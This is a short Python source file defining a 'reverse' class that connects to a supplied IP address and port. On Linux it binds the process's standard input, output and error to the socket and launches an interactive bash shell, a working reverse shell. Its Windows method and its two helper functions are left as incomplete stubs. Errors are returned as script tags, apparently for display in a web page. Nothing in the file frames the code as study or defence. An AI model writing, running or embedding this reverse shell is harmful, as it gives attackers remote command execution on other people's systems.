import os
from socket import *
from threading import Thread
from subprocess import call, PIPE, Popen

def s2p(s, p):
	pass

def p2s(s, p):
	pass


class reverse(object):
	def __init__(self, ipaddress, portaddress) -> None:
		self.ipaddress = ipaddress
		self.portaddress = int(portaddress)

	def windows(self):
		try:
			s = socket(AF_INET, SOCK_STREAM)
			s.settimeout(2)
			s.settimeout(None)
			s.connect((self.ipaddress, self.portaddress))
		except error as err:
			return f"<script>console.log('{err}')</script>"

	def linux(self):
		try:
			s = socket(AF_INET, SOCK_STREAM)
			s.connect((self.ipaddress, self.portaddress))
			os.dup2(s.fileno(), 0)
			os.dup2(s.fileno(), 1)
			os.dup2(s.fileno(), 2)
			x = call(['/bin/bash', '-i'])
		except error as err:
			return f"<script>console.log('{err}')</script>"